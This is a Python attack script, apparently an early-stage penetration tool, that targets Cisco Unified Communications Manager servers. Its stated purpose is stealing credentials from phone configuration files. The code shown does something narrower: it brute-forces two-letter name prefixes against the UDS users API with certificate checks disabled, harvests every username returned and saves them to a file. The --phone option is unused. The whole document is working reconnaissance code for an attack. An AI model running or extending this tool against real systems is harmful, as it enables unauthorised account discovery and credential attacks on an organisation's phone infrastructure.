#!/usr/bin/env python3

import argparse
import requests
import re
import ipaddress
import socket
import string
from bs4 import BeautifulSoup
from alive_progress import alive_bar
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Cisco Phone Systems by stealing credentials from phone configuration files')
    parser.add_argument('-H','--host', default=None, type=str, help='IP Address of Cisco Unified Communications Manager')
    parser.add_argument('-p','--phone', type=str, help='IP Address of a Cisco Phone')

    args = parser.parse_args()

    CUCM = args.host
    phone = args.phone
    #file_names = ''
    #hostnames = []

    file ='api_users'
    found_users = get_users_api(CUCM)
    output_users(file,found_users)


def get_users_api(CUCM_host):
    usernames =[]
    base_url = f'https://{CUCM_host}:8443/cucm-uds/users?name='
    try:
        with alive_bar(676, title="› Identifying Users  ", ) as prog_bar:
            for char1 in string.ascii_lowercase:
                for char2 in string.ascii_lowercase:
                    prog_bar()
                    url = base_url+char1+char2
                    __http_response = requests.get(url, timeout=2, verify=False)
                    if __http_response.status_code != 404:
                        lines = __http_response.text
                        soup = BeautifulSoup(lines, 'lxml')
                        for user in soup.find_all('username'):
                            usernames.append (user.text)
    except requests.exceptions.ConnectionError:
        print('CUCM Server {} is not responding'.format(CUCM_host))
    return usernames

def output_users(o_file,users):
    output_file = open(o_file,'w')
    for u in users:
        output_file.write(u + '\n')
    output_file.close()

main()

